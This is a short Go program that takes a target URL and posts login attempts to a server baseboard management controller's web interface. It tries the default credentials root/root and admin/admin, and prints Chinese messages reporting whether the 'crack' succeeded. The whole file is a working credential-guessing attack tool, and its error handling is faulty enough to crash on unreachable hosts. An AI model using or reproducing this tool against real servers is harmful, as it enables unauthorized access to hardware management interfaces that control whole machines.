package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func httpDo(url string,name string) {
	//name := "admin"
	ip := strings.Replace(url, "https://", "", -1)
	ip = strings.Replace(ip, "http://", "", -1)
	client := &http.Client{}
	password := "WEBVAR_USERNAME=" + name + "&WEBVAR_PASSWORD=" + name
	req, err := http.NewRequest("POST", url+"/rpc/WEBSES/create.asp", strings.NewReader(password))
	if err != nil {
		fmt.Println("主机可能不存活")
	}
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Origin", url)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	req.Header.Set("Referer", url+"/index.html")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Set("Cookie", "BMC_IP_ADDR="+ip+"; test=1")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("主机可能不存活")
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("读取失败")
	}
	str := string(body)
	if strings.Contains(str, "HAPI_STATUS:0") {
		fmt.Println("破解成功---帐号:" + name + "密码:" + name)
	} else {
		fmt.Println("破解失败")
	}
}

func main() {
	var url string
	flag.StringVar(&url, "u", "", "http(s)://url")
	flag.Parse()
	go httpDo(url,"root")
	httpDo(url,"admin")
}
